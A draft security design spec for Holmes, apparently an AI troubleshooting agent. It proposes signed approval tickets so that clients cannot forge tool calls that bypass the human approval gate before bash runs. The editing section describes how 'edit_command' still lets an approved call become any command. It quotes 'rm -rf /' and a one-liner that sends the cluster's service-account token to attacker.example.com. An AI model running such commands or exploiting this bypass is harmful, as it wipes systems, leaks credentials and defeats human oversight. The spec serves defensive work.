# Tool-Approval Tickets: Binding Approvals to Server-Issued State

**Status:** Draft
**Author:** Roi Glinik
**Related issue:** Security report on authenticated approval bypass (follow-up to GHSA-86qp-5c8j-p5mr / CVE-2026-48710)

---

## Problem Statement

Holmes's HTTP `/api/chat` endpoint accepts a `conversation_history` and a `tool_decisions`
list, both supplied by the client. On a "resume after approval" turn, Holmes scans the
client-supplied conversation_history for assistant tool calls flagged with
`pending_approval=true`, matches them to client-supplied `tool_decisions` by
`tool_call_id`, and executes any tool that the client says was approved.

There is no server-side proof that the `pending_approval` flag was ever set by the server
in a prior turn. A client holding `HOLMES_API_KEY` (or any actor able to reach the chat
endpoint in any deployment mode) can therefore:

1. Fabricate an assistant message containing an arbitrary tool call (e.g. `bash`) with
   `pending_approval=true`.
2. Approve it in the same request via `tool_decisions`.
3. Get the backend to execute the tool, fully bypassing the approval gate.

Affected code:

- `holmes/core/tool_calling_llm.py:280-296` — the resume-side scanner trusts
  `pending_approval` from message history.
- `holmes/core/tool_calling_llm.py:1415-1420` — where the server originally sets
  `pending_approval=True`.
- `server.py:440-700` — `/api/chat` endpoint that forwards `conversation_history` and
  `tool_decisions` straight into the resume path with no validation.

---

## What This Spec Solves

- Approvals can only be redeemed against a tool call the **server actually emitted as
  needing approval**. A client-fabricated `pending_approval=true` is rejected.
- The fix works for **both deployment modes**:
  - Direct Holmes-as-API (`HOLMES_API_KEY` is the only auth).
  - Robusta-platform path (UI → Supabase → ConversationWorker → Holmes), where any
    authenticated platform user with write access to the Conversations table is the
    relevant threat actor.
- No new external dependency. No new infra. Single env var (with a follow-up to
  derive from the existing Robusta `signing_key` so even that becomes optional —
  see "Signing Key" section).
- Stateless across requests (matches the current chat architecture, which replays
  conversation_history each turn rather than holding session state).

## What This Spec Explicitly Does NOT Solve On Its Own

These gaps exist in Holmes today and the ticket scheme alone does not close them.
See "Tool-call editing and post-approval validation" in the Design section for the
full discussion and recommended companion changes.

- **`edit_command` bypass.** The approval UI lets users edit the `command` field
  before approving (`ToolApprovalDecision.edit_command`). The edit is applied
  *after* ticket verification, so a user (or anyone able to write `tool_decisions`)
  can take any legitimate bash ticket and substitute an arbitrary command. The
  ticket's `args_hash` does not stop this. **Companion fix:** re-mint the ticket
  on edit so `args_hash` binds the post-edit args.
- **Post-approval validation skip.** At `bash_toolset.py:234`, `user_approved=True`
  bypasses the deny list AND the hardcoded blocks (`sudo`, `su`). Once a command
  is approved, no further safety check runs. **Companion fix:** make the DENIED
  branch always fire, only gate the APPROVAL_REQUIRED branch on `not user_approved`.

Both are recommended as v1.5 follow-ups, opened the same day v1 lands.

## What This Spec Explicitly Omits (for now)

- **Per-user binding of approvals.** A ticket proves "the server issued this approval
  request"; it doesn't prove "user X is the one approving it." Holmes has no user
  identity to bind to anyway in the direct-deploy mode. Tying tickets to a
  user-identity claim is deferred until Holmes supports it.
- **Key rotation / multiple active keys.** A single signing key is supported. If
  rotation becomes a requirement, a small `kid` field can be added later without
  breaking existing tickets.
- **Migration / backwards compatibility with old clients that don't echo tickets.**
  This is a security fix; old behavior is what we're closing. Resume requests that
  lack a valid ticket will be rejected. We are not adding a flag to disable the check.

---

## Signing Key (`HOLMES_APPROVAL_SIGNING_KEY`)

### Default behavior (v1): ephemeral per-process key

If `HOLMES_APPROVAL_SIGNING_KEY` is **not set**, Holmes generates a fresh 32-byte
key from `os.urandom` at process startup, holds it in memory only, and logs a
verbose warning explaining the consequences and how to configure a stable key
(see "Startup logging" in the implementation section for the exact log block).

What this means in practice:

- **Security-wise this is strictly stronger than a fixed env-var key.** The
  attacker can't read it from disk, env, or any config; it lives in process
  memory only, generated from a CSPRNG at boot.
- **Availability-wise, in-flight approvals do not survive Holmes restart.** A
  client whose approval was minted by the old process will get an
  `APPROVAL_REJECTED` stream event with `reason="bad_signature"` on resume and
  must re-ask the question. This is acceptable because the SSE stream was
  already broken by the restart.

## auto-supplied by the platform

add in future generated_values.yaml

---

## Design: Signed Approval Tickets via Raw HMAC

### Why raw HMAC, not JWT

- Signer and verifier are the **same Holmes process**. There is no third party that
  needs to verify tickets, so asymmetric crypto (RS256/ES256) buys nothing.
- HS256 JWT would be equivalent in security but adds a library dependency and the
  historical class of JWT alg-confusion / `alg: none` footguns. We don't need the JWT
  envelope.
- Raw HMAC keeps the implementation to ~30 lines using `hmac` + `hashlib` stdlib.
- Token format is internal — no consumer needs to parse it with off-the-shelf tooling.

### The ticket

A ticket is an opaque base64url-encoded blob of the form `body_b64.tag_b64` where:

- `body` is canonical JSON of:
  ```json
  {
    "v": 1,
    "tool_call_id": "call_abc123",
    "tool_name": "bash",
    "args_hash": "<hex sha256 of canonicalized arguments>",
    "iat": 1734567890,
    "exp": 1734571490
  }
  ```
- `tag = HMAC-SHA256(K, body_bytes)` where `K` is the server signing key.

### What the ticket binds, and why each field is necessary

| Field | Why |
|---|---|
| `v` | Ticket format version. Lets us evolve the body shape (add `kid`, change canonicalization, etc.) without ambiguity. v1 today. |
| `tool_call_id` | Pins the ticket to one specific tool call. Stops cross-approval (using a ticket from call A to approve call B). Also used as the single-use key for replay protection (see implementation). |
| `tool_name` | Defense in depth — even if `tool_call_id` somehow collides, the function name must match. |
| `args_hash` | Binds the ticket to the arguments the LLM originally proposed. See "Tool-call editing and post-approval validation" below for how this interacts with the `edit_command` flow — the binding is not as strong as it looks, and we recommend a companion change to make it meaningful. |
| `iat` / `exp` | Bounds how long an approval is good for. Default TTL: 1 hour. |

Verification on resume requires **all** of the following to pass:

1. `v == 1` (reject any other version; future versions will be additive).
2. HMAC tag valid under `hmac.compare_digest` (proves Holmes minted it).
3. `exp > now`.
4. `tool_call_id` matches the assistant tool_call's id in conversation_history.
5. `tool_name` matches the function name in conversation_history.
6. `sha256(canonical_args)` matches `args_hash`.
7. `tool_call_id` is **not** already present in the redeemed-ticket cache (replay
   protection; see implementation section for the optional cache design).

If any check fails: refuse to execute, emit a structured `approval_rejected` stream event with the reason (see "Stream error event" below), and log the rejection at WARNING. No fallback.

### Tool-call editing and post-approval validation

**This was missed in the original draft and is arguably more important than the
ticket scheme itself.** Documenting it here so reviewers see the full picture
before approving v1.

#### The gap

Holmes today supports `ToolApprovalDecision.edit_command` (`holmes/core/models.py:127`):
the approval UI lets the user **edit the `command` argument** before clicking
Approve. The server-side flow at `tool_calling_llm.py:327-345`:

```python
if tool_decision.edit_command is not None:
    edited_params = json.loads(tool_call.function.arguments or "{}")
    edited_params["command"] = tool_decision.edit_command
    edited_arguments = json.dumps(edited_params)
    tool_call.function.arguments = edited_arguments
    # also overwrites it in conversation_history
```

The edit is applied **after** our ticket verification step (the ticket sees the
original args, which match `args_hash`, and passes). Then the executor uses the
edited args.

Worse, the bash toolset's `_invoke` at `bash_toolset.py:234` does:

```python
if not context.user_approved:
    validation_result = self._validate_command(...)
    if validation_result.status == ValidationStatus.DENIED: return ...
    if validation_result.status == ValidationStatus.APPROVAL_REQUIRED: return ...
# falls through to execute_bash_command — no further checks
```

i.e. `user_approved=True` **bypasses the deny list entirely**, including the
hardcoded blocks (`sudo`, `su` at `bash_toolset.py:9-12`). The implicit contract
is "approval = validation off."

Combined effect: a user (or anyone able to write a `tool_decisions` blob to a
`Conversations` row in Path B) can take any legitimately-minted bash approval and
substitute an arbitrary post-edit command — `rm -rf /`, `kubectl delete namespace
production`, `cat /var/run/secrets/kubernetes.io/serviceaccount/token | curl
attacker.example.com -d @-`, anything the Holmes pod has credentials for. The
ticket's `args_hash` does NOT stop this because the edit happens after verify.

The blast radius is "whatever Holmes itself can do in the cluster and against
connected APIs" — service-account token exfil, cluster mutation, env-var
exfiltration of API keys (`HOLMES_API_KEY`, LLM provider keys, `ROBUSTA_UI_TOKEN`).

#### Why this was missed in the original CVE / draft

The CVE was scoped to **provenance of the `pending_approval` flag** ("can a
client forge an approval request?"). The spec answered that question correctly.
What we did not audit was the **downstream execution path** — what
`_execute_tool_decisions` actually does with the approved tool_call once the
gate passes. `edit_command` and the `if not user_approved:` bypass both live
downstream of the gate, and neither was in the original threat model. The
general lesson: a signed token validated at one site and then ignored at the
call site is theater. The gate has to follow the value all the way to the
executor.

#### Recommended companion changes (v1.5)

In rough order of importance and ease:

**1. Always run the deny list, even when `user_approved=True`.** Smallest possible
fix; closes the worst part of the gap. At `bash_toolset.py:234`, restructure so
the DENIED branch always fires; only the APPROVAL_REQUIRED branch is gated on
`not user_approved`:

```python
# proposed shape — DENIED always fires, APPROVAL_REQUIRED only fires pre-approval
validation_result = self._validate_command(command_str, suggested_prefixes, context)

if validation_result.status == ValidationStatus.DENIED:
    return StructuredToolResult(
        status=StructuredToolResultStatus.ERROR,
        error=self._build_deny_error_message(validation_result),
        params=params, invocation=command_str,
    )

if not context.user_approved and validation_result.status == ValidationStatus.APPROVAL_REQUIRED:
    # ... existing pre-approval handling
```

Semantics shift: "approve" stops meaning "validation off" and starts meaning
"the user confirmed they want to run this command from the *unknown / unfamiliar*
bucket." Hardcoded blocks and operator-configured denies still apply.

Operators who want `rm` or `kubectl delete` to be approvable can add them to the
allow list explicitly — same as today for any other command. The default
`HARDCODED_BLOCKS` list should be expanded to cover the obvious destructive
patterns: `rm -rf`, `kubectl delete namespace`, `kubectl delete crd`, `helm
uninstall`, `dd of=/dev/`, `mkfs`. These are operations no observability agent
needs to perform.

**2. Re-mint the approval ticket on edit, so `args_hash` actually binds what runs.**
When the UI sends a non-null `edit_command`, treat that as a NEW tool-call
proposal rather than a parameter on an existing approval:

- UI submits the edit; Holmes does NOT execute it.
- Holmes splices the edit into the assistant tool_call (same as today at
  `tool_calling_llm.py:337-344`), mints a fresh ticket bound to the *post-edit*
  `args_hash`, and emits a new `approval_required` event (Path A: SSE event;
  Path B: ConversationEvent).
- The UI receives the fresh `approval_required` event with the edited command
  already in it. It can either:
    - Auto-confirm on behalf of the user (since the edit was the user's own
      input — this is the recommended default; the user already clicked
      Approve once, the round-trip is invisible to them); or
    - Show a "confirm your edit" modal for high-risk operations
      (operator-configurable, off by default).

Two round-trips on the edit path only. Most approvals are accept-as-proposed
and unaffected. The ticket's `args_hash` now means "Holmes will execute these
exact bytes" — true to the spec.

**3. Tighten `edit_command` to only edit, not introduce.** The model field is
`Optional[str]` and the splicer at line 332 does `edited_params["command"] =
tool_decision.edit_command`. The edited value flows straight into bash without
schema constraints. Consider: enforce that the original tool_call had a `command`
key (so edit only mutates an existing field), reject edit_command for
non-`bash` tools (no other tool currently uses it), and add an explicit
allowlist of editable fields per tool if other tools start needing it.

#### Why v1 ships without these changes

Change #1 is a real toolset behavior change that needs its own discussion with
operators (it might break their workflows if they've been editing into commands
that are now hardcoded-denied). Change #2 is a protocol change for the UI
(new auto-confirm flow) and the chart/UI team should review the UX. Both are
small in code but big in coordination.

Ticketing alone (v1) is still a substantial improvement: it closes the trivial
"fabricate any pending_approval and approve it" path, which is the published
CVE. It leaves the "use a legitimate ticket + edit_command to escalate" path
open until v1.5 lands.

We should ship v1 + open follow-ups for both companion changes the same day,
with v1.5 prioritized.

### Stream error event

The verify site does NOT raise a raw HTTPException 400. Instead, it emits a structured stream event so the client can render an appropriate UX message (e.g. "your approval expired, please re-ask the question" vs. "approval rejected as invalid").

Add a new event to `holmes/utils/stream.py`:

```python
class StreamEvents(str, Enum):
    ...
    APPROVAL_REJECTED = "approval_rejected"
```

Payload shape:

```json
{
  "tool_call_id": "call_abc123",
  "tool_name": "bash",
  "reason": "expired",
  "message": "Approval expired. Please re-ask the question to get a fresh approval."
}
```

`reason` is one of:

| Reason | Meaning | Recommended client UX |
|---|---|---|
| `missing` | `pending_approval=true` with no ticket attached. Either an old client or a forged message. | Re-ask the question. |
| `expired` | Ticket past its `exp`. Benign — user took too long. | "Approval expired, please re-ask." |
| `bad_signature` | HMAC tag failed verification. Either key rotated (e.g. Holmes restarted with ephemeral key) or forgery. | "Approval invalid, please re-ask." |
| `version_mismatch` | `v` field is not 1. Likely client/server version skew. | "Approval invalid, please re-ask." |
| `id_mismatch` / `name_mismatch` / `args_mismatch` | Bound fields don't match the tool_call in conversation_history. Indicates tampering. | "Approval rejected." |
| `replayed` | `tool_call_id` already in the redeemed cache. | "This approval has already been used." |
| `malformed` | Ticket couldn't be parsed (bad base64, truncated, etc.). | "Approval invalid, please re-ask." |

After emitting the event, the stream closes for that turn. The client must initiate a fresh `/api/chat` request to retry.

---

## Flow

### Today (vulnerable)

```
client ──POST /api/chat──> Holmes
                            └── LLM proposes bash tool call
                            └── sets tool_call.pending_approval = True
                            └── streams approval_required event
                            <── stream pauses
client ──POST /api/chat with tool_decisions──> Holmes
                            └── walks conversation_history
                            └── trusts pending_approval flag (forgeable)
                            └── executes tool
```

### With this change

```
client ──POST /api/chat──> Holmes
                            └── LLM proposes bash tool call
                            └── server mints ticket = HMAC(K, {tool_call_id,
                                  tool_name, args_hash, iat, exp})
                            └── attaches ticket to tool_call.approval_ticket
                            └── streams approval_required event WITH ticket
                            <── stream pauses
client (echoes conversation_history including approval_ticket) ──POST /api/chat
                            └── walks conversation_history
                            └── for each tool_call with pending state:
                                  - require approval_ticket present
                                  - verify HMAC + exp + id/name/args_hash match
                                  - reject on any mismatch
                            └── only then execute tool
```

The client never needs to understand the ticket. The UI / SDK already round-trips
the entire assistant message including any new fields on it; `approval_ticket` is
just another opaque field that goes along for the ride. No frontend change required
for the platform UI path.

---

## Key Lifecycle (Restart Semantics)

### What is lost on Holmes restart

If Holmes is restarted while an approval was pending:

- All previously-issued tickets become invalid (the key that signed them is gone,
  if running with the default ephemeral key).
- A client that resumes after the restart with an in-flight `tool_decisions` will
  receive an `APPROVAL_REJECTED` stream event with `reason="bad_signature"` and
  must re-ask the question to get a fresh `approval_required` event with a new
  ticket.
- The redeemed-ticket replay cache is also lost. Combined with key loss this is
  harmless (no old ticket can verify anyway). With a *persistent*
  `HOLMES_APPROVAL_SIGNING_KEY`, the cache loss briefly re-enables replay of any
  un-expired ticket — operators using a persistent key should understand this is
  the residual replay window across restarts.

This is acceptable because:

- In-flight approvals are inherently short-lived (the user is sitting in the UI
  waiting for the approval modal).
- Holmes processes typically restart rarely. In Helm-managed deployments, restart
  reasons are config changes, image bumps, or crashes — none of which we expect to
  coincide with a user holding an unresolved approval modal often.
- The Robusta-platform path mostly uses one runner process per cluster with long
  uptime.
- Restarts already invalidate streaming connections (SSE is long-lived). A user whose
  stream dropped because of a restart is already going to have to retry.


---

## Open Questions

- Should we eventually derive the HMAC key via HKDF from the existing Robusta
  `signing_key` (already used as the master secret for OAuth Fernet encryption in
  `holmes/plugins/toolsets/mcp/oauth_token_store.py`)? This would give the
  platform-deploy path a stable shared key "for free" without operators needing to
  set yet another env var. The trap is that you must never reuse the same key
  bytes for two purposes (Fernet + HMAC); HKDF with distinct `info` strings
  (`b"holmes-oauth-fernet-v1"` vs. `b"holmes-approval-hmac-v1"`) is the textbook
  fix. Deferred to a follow-up since it requires touching the existing OAuth code
  to also derive through HKDF instead of using the master key directly. v1 ships
  with just the explicit `HOLMES_APPROVAL_SIGNING_KEY` env var (see "Future
  direction" in the Signing Key section).

---

# Implementation Details

Everything below is implementation — concrete code shapes, file locations, logging
formats, test matrix. Reviewers focused on the design contract can stop here; this
section is for whoever picks up the PR.

## New module: `holmes/utils/approval_tickets.py`

Small module exposing:

- `class ApprovalTicketError(Exception)` with a `reason: str` attribute drawn from
  the reason table in "Stream error event" above. Raised on every verification
  failure so callers can surface a structured rejection.
- `get_signing_key() -> bytes` — loads `HOLMES_APPROVAL_SIGNING_KEY` from env (base64
  or hex), or generates a per-process random key on first call. Logs at startup —
  see "Startup logging" below for exact messages.
- `mint_ticket(tool_call_id: str, tool_name: str, args: str, ttl_seconds: int = TICKET_TTL_SECONDS) -> str`
- `verify_and_consume_ticket(ticket: str, tool_call_id: str, tool_name: str, args: str) -> None`
  — verifies HMAC tag, version, expiry, and bound fields; atomically marks the
  `tool_call_id` redeemed. Raises `ApprovalTicketError` with the appropriate `reason`
  on any failure. Never returns a value — success is "did not raise."
- `canonicalize_args(args_json_string: str) -> bytes` — parses, sorts keys, re-serializes
  (full implementation below).
- `_user_message_for_reason(reason: str) -> str` — dispatch table mapping each
  reason in the table above to the user-facing string from the "Recommended client
  UX" column. Keeping this server-side means UI clients don't need to ship their
  own copy.
- `TICKET_TTL_SECONDS = 3600` — module-level constant. Hard-coded for v1; flipping it
  is a one-line change if needed.

## Argument canonicalization

The LLM emits a tool call's `arguments` as a JSON *string*, and `json.dumps` is whitespace-and-key-order-unstable by default. The same arguments round-tripped through a client (or even through Python's default serializer twice) can produce a different byte sequence and break `args_hash` verification.

`canonicalize_args` must:

```python
def canonicalize_args(args_json_string: str) -> bytes:
    parsed = json.loads(args_json_string or "{}")
    return json.dumps(
        parsed,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=False,
    ).encode("utf-8")
```

Edge cases that must be covered by tests:

- `arguments == ""` and `arguments is None` → both normalize to `{}`.
- `arguments` is invalid JSON → **fail closed** (verify raises `ApprovalTicketError`). Do not fall through to raw-string comparison.
- Unicode in args (some Holmes evals use non-ASCII strings in bash arguments) → preserved via `ensure_ascii=False`.
- Whitespace-only differences between mint and verify → normalized away.
- Key reordering between mint and verify → normalized away.

## Mint site

**`holmes/core/tool_calling_llm.py:~1420`**, where `tool_call["pending_approval"] = True`
is set. Add immediately after:

```python
tool_call["approval_ticket"] = mint_ticket(
    tool_call_id=tool_call["id"],
    tool_name=tool_call["function"]["name"],
    args=tool_call["function"].get("arguments", ""),
)
```

Also include the ticket in the stream event emitted at lines 1425-1440 so external
clients (non-Holmes UIs) can see it if they care.

## Verify site

**`holmes/core/tool_calling_llm.py:_execute_tool_decisions`, around line 286.**
Replace:

```python
if tool_call.get("pending_approval"):
    del tool_call["pending_approval"]
    pending_tool_calls.append(...)
```

with:

```python
if tool_call.get("pending_approval"):
    ticket = tool_call.get("approval_ticket")
    try:
        if not ticket:
            raise ApprovalTicketError(reason="missing")
        verify_and_consume_ticket(
            ticket,
            tool_call_id=tool_call["id"],
            tool_name=tool_call["function"]["name"],
            args=tool_call["function"].get("arguments", ""),
        )
    except ApprovalTicketError as e:
        logging.warning(
            "approval ticket rejected: reason=%s tool_call_id=%s tool_name=%s",
            e.reason,
            tool_call["id"],
            tool_call["function"]["name"],
        )
        yield {
            "event": StreamEvents.APPROVAL_REJECTED,
            "data": {
                "tool_call_id": tool_call["id"],
                "tool_name": tool_call["function"]["name"],
                "reason": e.reason,
                "message": _user_message_for_reason(e.reason),
            },
        }
        return  # close the stream for this turn

    del tool_call["pending_approval"]
    del tool_call["approval_ticket"]      # strip from echoed history (see below)
    pending_tool_calls.append(...)
```

Notes:

- **No `HTTPException`.** The verify site runs inside the streaming response
  generator; raising `HTTPException` mid-stream produces a confusing failure for
  the client (the HTTP status is already 200 by the time we got here). The
  structured `APPROVAL_REJECTED` event lets the UI render a clean message.
- **Stripping `approval_ticket` after redemption.** Once the ticket has been
  consumed, leave it out of the echoed history. Two reasons: (a) avoids
  re-disclosing a tag that's already been used, (b) the redeemed-cache rejects
  it on any future replay anyway, so the field is dead weight. The `del` happens
  before the tool_call is forwarded for execution and into the next streamed
  message.
- **Paired-flag invariant.** A tool_call with `approval_ticket` but no
  `pending_approval` is ignored (the gate doesn't fire), and the ticket field
  is stripped silently on the next round-trip. A tool_call with
  `pending_approval` but no ticket is the `missing` reason above. Both halves
  of the pair must be present and valid, or the gate doesn't pass.

## Startup logging

`get_signing_key()` is called once at server startup (eager init, not lazy) so the
operator sees the key source in the boot logs. Two cases:

**Case A — env var set:**

```
INFO  approval_tickets: using HOLMES_APPROVAL_SIGNING_KEY from environment
      (length=32 bytes); approvals will survive restarts.
```

**Case B — env var unset (generated key):**

```
WARNING  approval_tickets: HOLMES_APPROVAL_SIGNING_KEY is not set. Generated an
         ephemeral signing key for this process.
WARNING  approval_tickets: Consequences:
WARNING  approval_tickets:   - In-flight tool approvals will be invalidated when
         this pod restarts (users will need to re-ask their question).
WARNING  approval_tickets:   - In multi-replica deployments, approvals minted by
         one replica will be rejected by the others; load-balanced /api/chat
         requests will fail intermittently.
WARNING  approval_tickets: To configure a stable shared key:
WARNING  approval_tickets:   1. Generate one:  python -c "import os, base64; print(base64.b64encode(os.urandom(32)).decode())"
WARNING  approval_tickets:   2. In your Holmes Helm values, add it as an env var:
WARNING  approval_tickets:        additionalEnvVars:
WARNING  approval_tickets:          - name: HOLMES_APPROVAL_SIGNING_KEY
WARNING  approval_tickets:            valueFrom:
WARNING  approval_tickets:              secretKeyRef:
WARNING  approval_tickets:                name: holmes-secrets
WARNING  approval_tickets:                key: approval-signing-key
WARNING  approval_tickets:   3. Create the Kubernetes Secret with the value from step 1.
```

The block is verbose on purpose — single-replica hobby deploys log it once at
startup and the operator can ignore it; production deploys see it and act. It's
the only signal they'll get that they're running an insecure-against-restart
configuration.

**Multi-replica startup check.** If `HOLMES_REPLICAS_HINT` (set via the Helm
chart from `.Values.replicas`) is set and `> 1` AND `HOLMES_APPROVAL_SIGNING_KEY`
is unset, escalate the message to an `ERROR` log (still not fatal — Holmes
starts — but loud enough to show up in any alert pipeline that watches for
ERROR logs). The chart sets this hint automatically; operators using replicas
without the env var should not be able to miss it.

## Rejection logging

Every `ApprovalTicketError` is logged at `WARNING` level with a structured
record:

```
WARNING  approval ticket rejected: reason=<reason> tool_call_id=<id> tool_name=<name>
```

This is the signal operators should alert on. A burst of `reason=bad_signature`
or `reason=replayed` rejections indicates either a forged-ticket attempt or a
misconfigured deployment (e.g. multi-replica without a shared key).
`reason=expired` is benign and expected; the warning level is fine — it groups
naturally with the others in log search but doesn't need paging.

Do **not** log the ticket itself, the HMAC tag, or the `args_hash`. The reason
+ id + name is enough for triage and is safe to include in any log aggregator.

## Replay protection (single-use within TTL) — optional

Even a valid, untampered ticket must not be redeemable more than once. Without this, an attacker who observes one redeemed ticket (e.g. via leaked logs or a captured request) could replay the *same* approved tool call multiple times within the TTL window, doubling side effects (extra outbound API calls, repeated `rm`/`kubectl delete` invocations, repeated alert acknowledgments, etc.).

A small in-process `TTLCache` of redeemed `tool_call_id` values, with TTL equal to the ticket TTL, closes this gap:

```python
# in holmes/utils/approval_tickets.py
from cachetools import TTLCache
import threading

_REDEEMED = TTLCache(maxsize=10_000, ttl=TICKET_TTL_SECONDS)   # ttl matches ticket TTL
_REDEEMED_LOCK = threading.Lock()

def verify_and_consume_ticket(ticket, tool_call_id, tool_name, args) -> None:
    """Verify ticket; mark redeemed atomically. Raises ApprovalTicketError on any failure."""
    _verify_signature_and_fields(ticket, tool_call_id, tool_name, args)  # raises with .reason
    with _REDEEMED_LOCK:
        if tool_call_id in _REDEEMED:
            raise ApprovalTicketError(reason="replayed")
        _REDEEMED[tool_call_id] = True
```

Design choices:

- **Why `tool_call_id` as the cache key, not a separate `jti`.** LLM-emitted tool_call_ids are statistically unique per emission (sampled from the model output). Adding a `jti` UUID to the ticket body would duplicate that uniqueness without buying anything. Using `tool_call_id` keeps the body smaller and the cache key trivial to derive on both sides.
- **Atomicity.** Verify-and-consume under a single lock. Without this, two concurrent resume requests with the same valid ticket would both pass the "not in cache" check before either inserts, and both would execute. Holmes runs under uvicorn with async + worker threads; the lock is mandatory.
- **Cache bound.** 10,000 entries × ~50 bytes ≈ 500 KB. If Holmes ever sustains more than 10k pending approvals per hour, the LRU eviction would silently re-enable replay for the evicted entries. In practice the working set is the number of users sitting in front of an open approval modal at once — orders of magnitude below 10k. Worth a log line if eviction ever happens.
- **Multi-replica caveat.** The cache is per-process. Replay across replicas remains possible: a ticket redeemed on replica A could be replayed against replica B. This mirrors the signing-key-sharing gap and is acceptable for v1. A shared Redis or Supabase-backed redemption store is a follow-up if it becomes material.
- **Restart caveat.** The cache lives in memory and is lost on restart. Combined with the per-process random signing key fallback, restart already invalidates all in-flight tickets — so the cache loss doesn't open a new window. With a persistent `HOLMES_APPROVAL_SIGNING_KEY`, restart loses the redemption history while the signing key survives, briefly re-enabling replay until each ticket expires. Operators using persistent keys should be aware (documented in Key Lifecycle).

## Tests

Unit tests for `approval_tickets.py`:

- Roundtrip mint → verify_and_consume succeeds.
- Expired ticket → `ApprovalTicketError(reason="expired")`.
- Swapped `tool_call_id` → `id_mismatch`.
- Swapped `tool_name` → `name_mismatch`.
- Swapped args → `args_mismatch`.
- Tampered HMAC tag → `bad_signature`.
- Wrong `v` field → `version_mismatch`.
- Malformed base64 / truncated body → `malformed`.
- Same ticket consumed twice → first succeeds, second → `replayed`.
- Concurrent consume (two threads, same ticket) → exactly one succeeds, the
  other → `replayed`. Verifies the lock.
- Canonicalization: `args=""`, `args=None`, args with reordered keys, args
  with whitespace differences, args with unicode all round-trip cleanly.
- Canonicalization: invalid-JSON args → `ApprovalTicketError(reason="args_mismatch")`,
  never a fall-through to raw-string compare.

Integration tests against `/api/chat`:

- **PoC reproducer (must fail closed):** request with a fabricated assistant
  tool_call (`pending_approval=true`, no `approval_ticket`) plus a matching
  `tool_decisions` entry. Assert: `APPROVAL_REJECTED` stream event with
  `reason="missing"`, and no tool execution side-effect.
- **Tampered-args bypass attempt:** mint a real ticket for `bash {"command": "ls"}`,
  then resume with the same tool_call_id but `arguments` changed to
  `{"command": "rm -rf /tmp/foo"}`. Assert `reason="args_mismatch"`, no
  execution.
- **Cross-call reuse attempt:** mint a ticket for tool_call A, attach it to
  tool_call B in the resume payload. Assert `reason="id_mismatch"`.
- **Replay:** approve a tool call, let it execute successfully, then send the
  same resume payload again. Assert second call gets `reason="replayed"`,
  tool does not run twice.

Regression test:

- Full approve flow (real server-minted ticket round-tripped through
  `conversation_history`) still works end-to-end.

Startup-log test:

- Boot Holmes with `HOLMES_APPROVAL_SIGNING_KEY` unset → assert the WARNING
  block (including the "how to configure" instructions) is emitted exactly
  once.
- Boot Holmes with `HOLMES_APPROVAL_SIGNING_KEY` set → assert the INFO line
  is emitted and the WARNING block is not.
- Boot Holmes with `HOLMES_REPLICAS_HINT=3` and no env var → assert the
  message is escalated to ERROR level.
